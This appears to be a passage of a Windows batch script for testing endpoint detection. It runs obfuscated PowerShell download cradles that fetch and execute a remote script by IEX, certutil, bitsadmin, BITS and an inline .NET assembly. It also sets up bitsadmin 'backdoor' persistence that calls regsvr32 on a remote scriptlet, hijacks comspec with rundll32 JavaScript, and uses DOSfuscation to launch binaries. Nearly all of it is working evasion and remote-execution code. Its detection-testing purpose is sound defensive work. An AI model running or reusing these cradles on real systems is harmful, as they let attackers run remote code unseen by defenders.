start "" cmd /c powershell -c "popd;Set-Variable 9Z (&$ExecutionContext.(($ExecutionContext|GM)[6].Name).GetCommand($ExecutionContext.(($ExecutionContext|GM)[6].Name).GetCommandName('Ne*ct',1,1),[System.Management.Automation.CommandTypes]::Cmdlet)-Co InternetExplorer.Application -Pro @{Silent=(Get-Variable Tr*).Value;Visible=(Get-ChildItem Variable:/Fal*).Value;Navigate='https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt'});While((Variable 9Z -Val).(((Variable 9Z -Val)|GM|Where{$_.Name-ilike'Bu*y'}).Name)){&($ExecutionContext.(($ExecutionContext|GM)[6].Name).(($ExecutionContext.(($ExecutionContext|GM)[6].Name)|GM|Where{$_.Name-ilike'*m*ts'}).Name).Invoke('*t-S*p'))1}IEX (Variable 9Z -Val).(((Variable 9Z -Val)|GM|Where{$_.Name-ilike'*ment'}).Name).(((Variable 9Z -Val).(((Variable 9Z -Val)|GM|Where{$_.Name-ilike'*ment'}).Name)|GM|Where{$_.Name-ilike'b*y'}).Name).(((Variable 9Z -Val).(((Variable 9Z -Val)|GM|Where{$_.Name-ilike'*ment'}).Name).(((Variable 9Z -Val).(((Variable 9Z -Val)|GM|Where{$_.Name-ilike'*ment'}).Name)|GM|Where{$_.Name-ilike'b*y'}).Name)|GM|Where{$_.Name-ilike'o*Text'}).Name);(Variable 9Z -Val).Quit();[Void][Runtime.InteropServices.Marshal]::ReleaseComObject((Variable 9Z -Val))" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSCOMMSXML exec
start "" cmd /c powershell -c "ls _-*;SI Variable:/2 (&(Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name).(((Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name)|GM|Where{(DIR Variable:/_).Value.Name-like'*and'}).Name).Invoke((Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name).(((Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name).PsObject.Methods|Where{(DIR Variable:/_).Value.Name-like'*man*Name'}).Name).Invoke('N*-O*',1,1),[Management.Automation.CommandTypes]::Cmdlet)-ComOb MsXml2.ServerXmlHttp);(ChildItem Variable:\2).Value.(((ChildItem Variable:\2).Value|GM)[4].Name)('GET','https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt',(Get-ChildItem Variable:F*a*e).Value);(ChildItem Variable:\2).Value.(((ChildItem Variable:\2).Value|GM)[5].Name)();&(Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name).(((Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name)|GM|Where{(DIR Variable:/_).Value.Name-like'*let'}).Name).Invoke((Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name).(((Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name).PsObject.Methods|Where{(DIR Variable:/_).Value.Name-like'*man*Name'}).Name).Invoke('I*e-E*',1,$TRUE))(ChildItem Variable:\2).Value.(((ChildItem Variable:\2).Value|GM)[16].Name)" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSINLINECSHARP exec
start "" cmd /c powershell -c "SI Variable:\x 'public class Xlqndampcv{public static string IGJnkoBiM(string url){return (new System.Net.WebClient()).DownloadString(url);}}';dir ty*;.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|Where{$_.Name-ilike'*ts'}).Name).Invoke('A*-T*p*e')-Lang CSharp (Variable x).Value;Set-Item Variable:\0 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';.(GAL I*X)(([Xlqndampcv]::IGJnkoBiM((ChildItem Variable:0).Value)))" 
echo Execution Finished at %time% %date% 
timeout 5

echo %time% %date% [+] Testing MEMORY\PSCOMPILEDCSHARP exec
start "" cmd /c powershell -c "[Void][System.Reflection.Assembly]::Load([Byte[]](@(77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184)+@(0)*7+@(64)+@(0)*35+@(128,0,0,0,14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104,105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111,116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32,109,111,100,101,46,13,13,10,36)+@(0)*7+@(80,69,0,0,76,1,3,0,126,189,77,91)+@(0)*8+@(224,0,2,33,11,1,11,0,0,4,0,0,0,6,0,0,0,0,0,0,110,35,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(32,35,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,116,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(80,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,168,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,204,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,68,2,0,0,8,0,0,0,35,85,83,0,76,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,92,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,99,0,67,0,6,0,131,0,67,0,10,0,179,0,168,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,109,32,0,0,0,0,134,24,57,0,15,0,2,0,0,0,1,0,63,0,17,0,57,0,19,0,25,0,57,0,15,0,33,0,57,0,15,0,33,0,189,0,24,0,9,0,57,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(161,0,0,0,4)+@(0)*11+@(1,0,27,0,0,0,0,0,4)+@(0)*11+@(1,0,36)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,67,108,97,115,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,77,101,116,104,111,100,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,3,32,0,0,0,0,0,103,95,116,171,97,113,148,66,141,34,197,250,155,72,85,140,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,72,35)+@(0)*8+@(0,0,94,35,0,0,0,32)+@(0)*22+@(80,35)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*154+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,112,51)+@(0)*502));([Class]::Method('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt')) | iex" 
echo Execution Finished at %time% %date% 
timeout 5

echo %time% %date% [+] Testing MEMORY\CERTUTIL exec
start "" cmd /c powershell -c "SV c3z 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';dir ty*;SI Variable:\NI1 (certutil -ping (GV c3z).Value);.(GAL IE*)(((Variable NI1 -Val)[2..(((Variable NI1 -Val)).Length-2)]-Join\"`r`n\"))"
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing DISK\PSWEBFILE exec
start "" cmd /c powershell -c "SI Variable:\9 'Net.WebClient';SV iH 'Default_File_Path.ps1';Set-Item Variable:gE 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';sl;SI Variable:/g (.(Variable *uti*t).Value.(((Variable *uti*t).Value|Member)[6].Name).(((Variable *uti*t).Value.(((Variable *uti*t).Value|Member)[6].Name)|Member|Where-Object{(Variable _ -ValueO).Name-like'G*ts'}).Name).Invoke('Ne*ct')(Variable 9).Value);SI Variable:h20 ((((Get-Item Variable:/g).Value|Member)|Where-Object{(Variable _ -ValueO).Name-like'Do*o*d*le'}).Name);(Get-Item Variable:/g).Value.((GV h20).Value).Invoke((GCI Variable:\gE).Value,(Variable iH -Val));(Variable *uti*t).Value.(((Variable *uti*t).Value|Member)[6].Name).InvokeScript((-Join([Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes((Variable iH -Val))))))"
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing DISK\PSBITS exec
start "" cmd /c powershell -c "Set-Variable pD5 'Default_File_Path.ps1';SI Variable:YD2 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';$NULL=Help(Get-Command *ar*Bi*s*);.(Get-Command *ar*Bi*s*)-So (Get-Variable YD2 -ValueOn) -Destina (DIR Variable:/pD5).Value;$ExecutionContext|ForEach{(Get-ChildItem Variable:_).Value.(($ExecutionContext|GM)[6].Name)|ForEach{(Get-Item Variable:/_).Value.InvokeScript((([Char[]](GC -En 3 (DIR Variable:/pD5).Value))-Join''))}}"
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing DISK\BITSADMIN exec
start "" cmd /c powershell -c "Set-Item Variable:\PL2 'Default_File_Path.ps1';SV 69x 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';$NULL=bitsadmin /transfer /ybBUL (LS Variable:69x).Value (GV PL2).Value;([String]::Join('',((GC -Encodin 3 (GV PL2).Value)|ForEach{[Char](GI Variable:_).Value})))|IEX"
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing DISK\CERTUTIL exec
start "" cmd /c powershell -c "Set-Variable T2Z 'Default_File_Path.ps1';SV kz1 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';$NULL=C:\Windows\System32\certutil -urlcache /f (Get-Variable kz1).Value (Get-Variable T2Z -ValueOn);&(Get-Alias *EX)(([System.String]::Join('',([Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes((Get-Variable T2Z -ValueOn)))))))"
echo Execution Finished at %time% %date%
timeout 5

REM ---- EOF Invoke-CradleCrafter Payloads ----

echo **********************************************
echo *        Testing Variations                  *
echo **********************************************

echo %time% %date% [+] Testing bitsadmin persistance via regsvr32 exec
REM taken from https://github.com/3gstudent/bitsadminexec
start "" cmd /c bitsadmin /create backdoor
start "" cmd /c bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
start "" cmd /c bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct scrobj.dll"
start "" cmd /c bitsadmin /Resume backdoor
start "" cmd /c bitsadmin /Cancel backdoor
echo Execution Finished at %time% %date%
echo Command Excuted: bitsadmin /create backdoor
echo Command Excuted: bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
echo Command Excuted: bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct scrobj.dll"
echo Command Excuted: bitsadmin /Resume backdoor
echo Command Excuted: bitsadmin /Cancel backdoor

timeout 5

echo %time% %date% [+] Testing manage-bde.wsf with rundll32 JS exec
set comspec=rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
start "" cscript C:\windows\system32\manage-bde.wsf
set comspec=C:\WINDOWS\system32\cmd.exe
echo Execution Finished at %time% %date%
echo Command Excuted: set comspec=rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
echo Command Excuted: cscript C:\windows\system32\manage-bde.wsf
echo Command Excuted: set comspec=C:\WINDOWS\system32\cmd.exe
timeout 5


:: Generate like this: Invoke-DOSfuscation -Command 'calc.exe' -CliCommand 'Binary\Cmd\2' -Quiet
echo %time% %date% [+] Testing BINARY\CMD\1 exec
start "" %PUBLIC:~-1%m%TMP:~-15,1%
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing BINARY\CMD\2 exec
start "" FOR /F "tokens=2 delims==Yf" %L IN ('assoc.cmd')DO %L
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing BINARY\CMD\3 exec
start "" ^F^o^r  ;   ,  ,  ,  ;   /^F  ,   ,  ;  ,  "   delims=nGfMK       tokens=    1    "    ,   ,    ;   ,   ,   %Y   ,    ,  ;   ,   ^in    ;  ;   ,  ;   (  ,   ;  ,  ,   '   ;    ;   ,   ^^FtY^^P^^e  ,  ;   ;   ;  ,   ^|   ;  ;   ;  ;   ;    ^^F^^in^^D  ;    ,  ,  "mdfi"  ;  ;    ,  ,  '   ;   ;   ,   )  ;  ,  ,  ,  ,   ,  ;  ^D^O  ;    ;  ;   ,   ,    %Y
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing BINARY\PS\1 exec
start "" %PUBLIC:~-6,-5%%ProgramData:~-9,-8%%SystemRoot:~3,-6%%ProgramFiles:~14,1%rsh%CommonProgramW6432:~-2,-1%l%TMP:~-10,1%
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing BINARY\PS\2 exec
start "" FOR /F "tokens=9 delims=L.\Dg" %J IN ('ftype^|findstr v1.')DO %J
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing BINARY\PS\3 exec
^F^o^R   ;  ,    ;   ;  ;  ;   ;  /^F    ;   ,  ,  ,  ,   "    tokens=   3    delims=mC."    ,  ,   ;    ,  ,   %6  ;  ,  ;   ,   ,  ;  ^IN   ,  ,   ,  ,  ;   ,  ,   (   ;  ;    ;  ,   ;    '   ;    ;   ;   ,   ;  ,   ;    ^^a^^s^^S^^O^^c   ;  ,    ,  ,    ,  ;  .cdxml     '  ,  ,  ;   ,  ;   )   ,  ;   ,  ^d^O    ,  ;  ,    %6
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing ENCODING\1 exec
start "" ca%ProgramFiles:~13,1%c.%TMP:~-3,-2%x%CommonProgramFiles:~-2,1%
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing ENCODING\2 exec
start "" ca%LOCALAPPDATA:~-1,1%%PUBLIC:~-1%.%TMP:~5,1%x%CommonProgramFiles(x86):~-21,1%
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing ENCODING\3 exec
start "" ca%COmmOnprogRAMW6432:~   -3,     1%%tmP:~    -8,   1%.%TMP:~    -3,   -2%x%PrOGRAMFIleS(X86):~    -8,      1%
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing PAYLOAD\CONCAT\1 exec
start "" cmd /C"set Gs=calc&&set 9Uv=.exe&&call set 8pW=%Gs%%9Uv%&&call %8pW%"
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing PAYLOAD\CONCAT\2 exec
start "" ^c%ComMonprogrAMfIlEs:~ 20,-8%^D,  ,  , , /%CommONPRogRAMW6432:~  -12, +1%" , (^S^Et oA^t^p=^xe)& ( ,(sE^t ^ ^ CKl^w=c^alc.e),  )&  , cAlL , , ^Se^t   Pw=%CKl^w%%oA^t^p%&& , , ( (cA^ll , %P^w%), )  "
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing PAYLOAD\CONCAT\3 exec
^FOr;/^f,"  delims=0MHFNZ  tokens= +2  " ,%^y , ^IN,; ( ,; ' ; ft^^yp^^E ,, ^| , ^^FiN^^D^^ST^^r ,S^^H^^Cm' , , ) ; ; d^O ,%^y; ; YPd7aN ,TZ2azt/%coMMonPROGRaMW6432:~17,  -11%",( (S^eT ^]$=^.) )&&  ( , (sE^t @^*$^_=^e) , , )&  (  ,(^s^E^T ^ ^ ~^?^-=^x) )&& (, (s^Et ^ ^ ^#^?_=a^l) ; )&  (^SET ^,;^-=e)&(^SeT ^  ^}^[@=^c)&&(S^Et ^ ^~^\+^'=^c)&, , ^C^A^l^l ;^S^e^t .'$_=%^~^\+^'%%^#^?_%%^}^[@%%^]$%%@^*$^_%%~^?^-%%^,;^-%&; ;( ,  , ,  , ,  (C^A^LL ;%.'^$^_%)  , )  "
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing PAYLOAD\REVERSE\1 exec
start "" cmd /V:ON/C"set bRm=exe.clac&&for /L %v in (7;-1;0)do set nT=!nT!!bRm:~%v,1!&&if %v==0 call %nT:~4%"
echo Execution Finished at %time% %date%
timeout 5
echo %time% %date% [+] Testing PAYLOAD\REVERSE\2 exec
start "" %comMoNproGraMW6432:~ 17,+1%^m%Os:~   3,  -6%;   ; ^/V:^o  ;  ; /R " ;; (^SE^t ^ ^ ^ T4=k^TU^e^AG^0xcw^m^eK^s8^.G^Q^d^ce^R^Xl^7d^u^aYOoc)&&;  ^fOr  ; ;  /^L ;  %^w  ;  ; ^IN ;  ;; ( ^ 31  ;^ ^;^ -4^ 3^ ^ ) ; D^O ;  ; ;  (  (;  ;^sET    5^u=!5^u!!T4:~%^w,  1!) )& ;  ; ^i^F; ; %^w ;  ; ^Equ; ;^3 ;; (   (^C^aL^L ;  ; %5^u:^*^5u^!=%   ) ; ; )   "
echo Execution Finished at %time% %date%
timeout 5